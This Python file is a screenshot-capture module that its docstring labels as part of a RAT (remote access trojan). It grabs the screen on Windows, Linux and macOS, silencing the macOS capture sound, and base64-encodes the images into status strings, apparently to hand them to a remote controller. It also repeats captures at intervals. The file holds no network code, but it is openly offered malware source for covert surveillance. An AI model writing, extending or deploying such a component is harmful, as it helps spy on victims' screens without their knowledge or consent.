#!/usr/bin/env python3
"""
SCREENSHOT CAPTURE MODULE FOR RAT
"""

import platform
import tempfile
import base64
import os
import subprocess

class ScreenshotCapture:
    def __init__(self):
        self.system = platform.system().lower()
        
    def capture(self, quality=85):
        """Capture screenshot and return base64 encoded image"""
        try:
            if self.system == 'windows':
                return self._windows_screenshot(quality)
            elif self.system == 'linux':
                return self._linux_screenshot(quality)
            elif self.system == 'darwin':
                return self._mac_screenshot(quality)
            else:
                return f"ERROR: Unsupported operating system: {self.system}"
        except Exception as e:
            return f"ERROR: Screenshot capture failed: {str(e)}"

    def _windows_screenshot(self, quality):
        """Windows screenshot using PIL"""
        try:
            from PIL import ImageGrab
            import io
            
            # Capture screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to JPEG with specified quality to reduce size
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=quality, optimize=True)
            
            # Encode to base64
            img_data = base64.b64encode(img_bytes.getvalue()).decode('utf-8')
            
            return f"SUCCESS:SCREENSHOT:JPEG:{quality}:{img_data}"
            
        except ImportError:
            return "ERROR: PIL library not available. Install with: pip install Pillow"
        except Exception as e:
            return f"ERROR: Windows screenshot failed: {str(e)}"

    def _linux_screenshot(self, quality):
        """Linux screenshot using available tools"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            temp_file.close()
            
            success = False
            
            # Try different screenshot methods in order of preference
            methods = [
                # Method 1: gnome-screenshot
                ['gnome-screenshot', '-f', temp_file.name, '-p'],
                # Method 2: scrot
                ['scrot', '-q', str(quality), temp_file.name],
                # Method 3: ImageMagick import
                ['import', '-window', 'root', temp_file.name],
                # Method 4: maim
                ['maim', temp_file.name],
            ]
            
            for method in methods:
                try:
                    result = subprocess.run(method, capture_output=True, timeout=10)
                    if result.returncode == 0:
                        success = True
                        break
                except:
                    continue
            
            if not success:
                return "ERROR: No screenshot tool available. Install one of: gnome-screenshot, scrot, imagemagick, or maim"
            
            # Read and encode the captured image
            with open(temp_file.name, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Cleanup
            os.unlink(temp_file.name)
            
            return f"SUCCESS:SCREENSHOT:JPEG:{quality}:{img_data}"
            
        except Exception as e:
            # Cleanup on error
            try:
                os.unlink(temp_file.name)
            except:
                pass
            return f"ERROR: Linux screenshot failed: {str(e)}"

    def _mac_screenshot(self, quality):
        """macOS screenshot using screencapture"""
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            temp_file.close()
            
            # Use macOS screencapture command
            result = subprocess.run(['screencapture', '-x', '-t', 'jpg', temp_file.name], 
                                  capture_output=True, timeout=10)
            
            if result.returncode != 0:
                return "ERROR: macOS screencapture failed"
            
            # Read and encode the image
            with open(temp_file.name, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Cleanup
            os.unlink(temp_file.name)
            
            return f"SUCCESS:SCREENSHOT:JPEG:{quality}:{img_data}"
            
        except Exception as e:
            # Cleanup on error
            try:
                os.unlink(temp_file.name)
            except:
                pass
            return f"ERROR: macOS screenshot failed: {str(e)}"

    def capture_multiple(self, count=3, delay=2):
        """Capture multiple screenshots with delay"""
        import time
        
        screenshots = []
        
        for i in range(count):
            result = self.capture()
            if result.startswith("SUCCESS:"):
                screenshots.append(result)
            else:
                screenshots.append(f"Attempt {i+1}: {result}")
            
            if i < count - 1:  # Don't delay after the last capture
                time.sleep(delay)
        
        return screenshots

# Example usage and testing
if __name__ == "__main__":
    import sys
    
    screenshot = ScreenshotCapture()
    
    if len(sys.argv) > 1 and sys.argv[1] == "multi":
        # Capture multiple screenshots
        results = screenshot.capture_multiple(3, 2)
        for i, result in enumerate(results, 1):
            print(f"Screenshot {i}: {result[:100]}...")  # Print first 100 chars
    else:
        # Capture single screenshot
        result = screenshot.capture()
        print(f"Result: {result[:200]}...")  # Print first 200 chars